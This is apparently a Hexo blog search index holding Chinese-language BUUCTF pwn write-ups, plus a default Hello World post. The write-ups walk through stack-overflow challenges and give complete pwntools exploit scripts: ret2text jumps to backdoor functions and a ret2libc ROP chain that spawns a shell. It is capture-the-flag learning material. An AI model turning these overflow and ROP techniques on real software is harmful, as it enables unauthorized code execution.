<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>寒假pwn题第二天</title>
    <link href="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/"/>
    <url>/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF刷题"><a href="#BUUCTF刷题" class="headerlink" title="BUUCTF刷题"></a>BUUCTF刷题</h1><h3 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h3><p>首先还是check:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br></code></pre></td></tr></table></figure><p>IDA打开后，shift+f12查看字符串f看到了&#x2F;bin&#x2F;sh:</p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129154915239.png" alt="image-20230129154915239"></p><p>双击，发现了&#x2F;bin&#x2F;sh在函数callsystem()中:</p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129155107710.png" alt="image-20230129155107710"></p><p>查看该函数，发现含有system(“&#x2F;bin&#x2F;sh”)，同时发现main里只有一个write，和一个返回语句</p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129155228230.png" alt="image-20230129155228230"></p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129155234812.png" alt="image-20230129155234812"></p><p>打开返回函数，发现read可以读入0x200的字符串，再看一下buf的长度是0x80，存在溢出</p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129155351770.png" alt="image-20230129155351770"></p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129155403160.png" alt="image-20230129155403160"></p><p>回看后门函数callsystem的函数地址为0x400596:</p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129155604148.png" alt="image-20230129155604148"></p><p>构造exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-string">&#x27;26880&#x27;</span>)<br> <br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x80</span>+<span class="hljs-number">0x8</span>) + p64(<span class="hljs-number">0x400596</span>)<br><br>p.sendline(payload)<br> <br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h3><p>经典check环节:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br></code></pre></td></tr></table></figure><p>审计一下main函数里的代码,观察到只有输入1才能进下一步:</p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129164638161.png" alt="image-20230129164638161"></p><p>主函数能获取到的信息有限，按顺序先看一下begin()函数，发现好像是小程序一类的，1是加密，2是解密:</p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129164946246.png" alt="image-20230129164946246"></p><p>进入加密函数encrypt()看一下，发现gets，栈溢出漏洞出现了。这段代码大概意思就是，读取s，然后根据ascii码范围不同分别进行异或:</p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129165117594.png" alt="image-20230129165117594"></p><p>64位程序里面的传参方式是前六位参数为寄存器传参，故不能直接把参数写在栈里，需要通过gadgets来实现控制寄存器的值从而控制函数参数的值。我们用gadget去找一下pop rdi的地址,</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">ROPgadget --binary ciscn_2019_c_1 <span class="hljs-string">| grep &quot;</span>pop rdi ; ret<span class="hljs-string">&quot; </span><br></code></pre></td></tr></table></figure><p>为0x400c83，然后通过 p64(pop_rdi_addr)+p64(参数值)+p64(函数地址) 即可调用函数:</p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129165443140.png" alt="image-20230129165443140"></p><p>特别注意到题目是部署在Ubuntu18上的，因此调用system需要栈对齐，这里填充ret来对齐,地址为0x4006b9:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">ROPgadget --binary ciscn_2019_c_1 <span class="hljs-string">| grep &quot;</span>ret<span class="hljs-string">&quot;  </span><br></code></pre></td></tr></table></figure><p>exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">string</span>):<br>    newstr = <span class="hljs-built_in">list</span>(string)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(newstr)):<br>        c = <span class="hljs-built_in">ord</span>(string[i])<br>        <span class="hljs-keyword">if</span> c &lt;= <span class="hljs-number">96</span> <span class="hljs-keyword">or</span> c &gt; <span class="hljs-number">122</span>:<br>            <span class="hljs-keyword">if</span> c &lt;= <span class="hljs-number">64</span> <span class="hljs-keyword">or</span> c &gt; <span class="hljs-number">90</span>:<br>                <span class="hljs-keyword">if</span> c &gt; <span class="hljs-number">47</span> <span class="hljs-keyword">and</span> c &lt;= <span class="hljs-number">57</span>:<br>                    c ^= <span class="hljs-number">0xF</span><br>            <span class="hljs-keyword">else</span>:<br>               c ^= <span class="hljs-number">0xE</span><br>        <span class="hljs-keyword">else</span>:<br>            c ^= <span class="hljs-number">0xD</span><br>        newstr[i] = <span class="hljs-built_in">chr</span>(c)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(newstr)<br><span class="hljs-comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,29403)</span><br>p = process(<span class="hljs-string">&#x27;./ciscn_2019_c_1&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ciscn_2019_c_1&#x27;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi = <span class="hljs-number">0x0000000000400C83</span> <span class="hljs-comment">#一个万能的gadget，x64程序基本都存在，pop rdi;ret;</span><br><span class="hljs-comment">#start_addr = 0x0000000000400790</span><br>main_addr = <span class="hljs-number">0x000000000400B28</span> <span class="hljs-comment">#主函数地址</span><br>p.recv()<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;encrypted\n&#x27;</span>)<br><span class="hljs-comment">#泄露puts实际地址</span><br>payload = <span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">0x58</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)<br>p.sendline(encrypt(payload))<br><br><span class="hljs-comment">#print encrypt(payload)</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;Ciphertext\n&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-comment">#接受puts的实际地址</span><br>addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><br><span class="hljs-comment">#print &quot;addr=&quot;, hex(addr)</span><br><span class="hljs-comment">#此处搜寻到的libc是本机的libc-2.23.so,需要自行添加到database，</span><br><span class="hljs-comment">#具体方法可上github，搜寻libc_database项目</span><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>, addr)<br>libcbase = addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br><br><span class="hljs-comment">#print &#x27;str_bin_sh=&#x27;,hex(libc.dump(&#x27;str_bin_sh&#x27;))</span><br><span class="hljs-comment">#print libc.dump(&#x27;system&#x27;)</span><br><br>p.recv()<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;encrypted\n&#x27;</span>)<br>sys_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_sh = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><span class="hljs-comment">#下面为正常脚本，可以在kali中拿到shell，如果是Ubuntu18，需要在里面加ret进行栈对齐</span><br>payload = <span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">0x58</span>+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)<br>ret = <span class="hljs-number">0x4006b9</span><br>payload_Ubuntu18 = <span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">0x58</span>+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>经典的ret2libc的题，但还是感觉有点难，后续还要再看看。这里exp引用了csdn的一篇文章,附上连接:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://blog.csdn.net/qinying001/article/details/<span class="hljs-number">103266763</span>?spm=<span class="hljs-number">1001</span>.<span class="hljs-number">2101</span>.<span class="hljs-number">3001</span>.<span class="hljs-number">6661</span>.<span class="hljs-number">1</span>&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-<span class="hljs-number">2</span>%<span class="hljs-number">7</span>Edefault%<span class="hljs-number">7</span>EBlogCommendFromBaidu%<span class="hljs-number">7</span>ERate-<span class="hljs-number">1</span>-<span class="hljs-number">103266763</span>-blog-<span class="hljs-number">104986595</span>.pc_relevant_vip_default&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-<span class="hljs-number">2</span>%<span class="hljs-number">7</span>Edefault%<span class="hljs-number">7</span>EBlogCommendFromBaidu%<span class="hljs-number">7</span>ERate-<span class="hljs-number">1</span>-<span class="hljs-number">103266763</span>-blog-<span class="hljs-number">104986595</span>.pc_relevant_vip_default&amp;utm_relevant_index=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h3><p>经典check，这保护开的，第一次见到这种场面的我心脏骤停:</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">Arch:</span>     i386-<span class="hljs-number">32</span>-little<br><span class="hljs-symbol">RELRO:</span>    <span class="hljs-keyword">Partial</span> RELRO<br><span class="hljs-symbol">Stack:</span>    canary found<br><span class="hljs-symbol">NX:</span>       NX enabled<br><span class="hljs-symbol">PIE:</span>      PIE enabled<br></code></pre></td></tr></table></figure><p>IDA32打开(终于有32位的文件了QAQ)啊嘞，虽然保护开的吓人，但是这代码审计不难，大概就是让var[13]等于17就成功了::</p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129170823918.png" alt="image-20230129170823918"></p><p>由于一开始就有让我们输入name，所以只需要将var数组里全填上17就可通过判断了:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">26348</span>)<br><br>payload = p32(<span class="hljs-number">17</span>)*<span class="hljs-number">14</span><br><br>p.sendline(payload)<br><br>p.<span class="hljs-built_in">int</span>eractive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>寒假pwn题第一天</title>
    <link href="/2023/01/09/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%80%E5%A4%A9/"/>
    <url>/2023/01/09/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%80%E5%A4%A9/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF刷题"><a href="#BUUCTF刷题" class="headerlink" title="BUUCTF刷题"></a>BUUCTF刷题</h1><h3 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h3><p>拿到题不管三七二十一先check一下，64位文件，无保护:</p><p><img src="/2023/01/09/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%80%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第一天\1.png"></p><p>丢进ida64里，看汇编还是有点费劲，选择F5看伪C代码：</p><p>很容易看到第11行的gets，很明显的栈溢出。shift+f12又发现了cat flag.txt：</p><p><img src="/3.png" alt="图片3"></p><p>那局势就很明了了，标准的ret2text，双击进去，Ctrl+x发现在sub_40060D中调用了此字符串：</p><p><img src="/4.png" alt="图片4"></p><p>回到main函数看一下v5的长度：</p><p><img src="/5.png" alt="图片5"></p><p>万事俱全,exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28016</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x48</span> + p64(<span class="hljs-number">0x40060D</span>) <br><br>p.sendline(payload) <br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h3><p>同样check,64位，只开了NX保护:</p><p><img src="/6.png" alt="图片6"></p><p>主函数平平无奇，调用了一个func()函数，进去看看:</p><p><img src="/7.png" alt="图片7"></p><p><img src="/8.png" alt="图片8"></p><p>代码审计，发现当v2&#x3D;11.28125时能拿到flag。我们用gets输入的是v1，只需要控制v1的长度，是v1溢出给v2填充为11.28125即可。不过要注意，这里的11.28125需要是16进制的。</p><p>附上exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29450</span>) <br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * (<span class="hljs-number">0x30</span>-<span class="hljs-number">0x4</span>) + p64(<span class="hljs-number">0x41348000</span>) <br><br>p.sendline(payload) <br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h3><p>check，32位，只开了NX保护:</p><p><img src="/9.png" alt="图片9"></p><p>可以看到第12行的fgets是我们的输入点，但是它只读入了32（&#x3D;0x20）长度的数据，小于0x3c，没有办法造成溢出，代码审计后发现，会把字符’I’变成’you’：</p><p><img src="/10.png" alt="图片10"></p><p>shell地址也直接给了我们:</p><p><img src="/11.png" alt="图片11"></p><p>附上exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26413</span>)<br><br>payload = <span class="hljs-string">b&#x27;I&#x27;</span> * <span class="hljs-number">21</span> + <span class="hljs-string">b&#x27;a&#x27;</span> + p32(<span class="hljs-number">0x8048f0D</span>)<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>假期有点懒散，考完试摆了快一个星期了QAQ，最近实验室安排了才开始学，好多都忘了。第一天就写 三道ret2text叭，之后要加加油了。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/01/08/hello-world/"/>
    <url>/2023/01/08/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
